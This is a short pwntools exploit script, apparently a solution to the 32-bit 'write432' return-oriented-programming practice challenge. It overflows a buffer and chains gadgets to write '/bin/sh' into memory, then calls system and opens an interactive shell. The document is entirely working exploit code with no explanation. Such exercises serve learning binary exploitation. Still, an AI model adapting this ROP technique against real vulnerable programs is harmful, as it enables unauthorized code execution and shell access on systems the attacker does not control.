from pwn import *
from struct import pack

pop2ret = 0x080486da
mov = 0x08048670
bin_sh_addr = 0x0804a028
bin_sh_str_1 = 0x2f62696e
bin_sh_str_2 = 0x2f736800
system_call = 0x8048430


p = process('./write432')

exploit = ''
exploit += 'A'*44
exploit += p32(pop2ret)
exploit += p32(bin_sh_addr)
exploit += pack(">I", bin_sh_str_1)

exploit += p32(mov)
exploit += p32(pop2ret)
exploit += p32(bin_sh_addr+4)
exploit += pack(">I", bin_sh_str_2)

exploit += p32(mov)
exploit += p32(system_call)
exploit += 'aaaa'
exploit += p32(bin_sh_addr)

p.recvuntil('>')
p.sendline(exploit)
p.interactive()

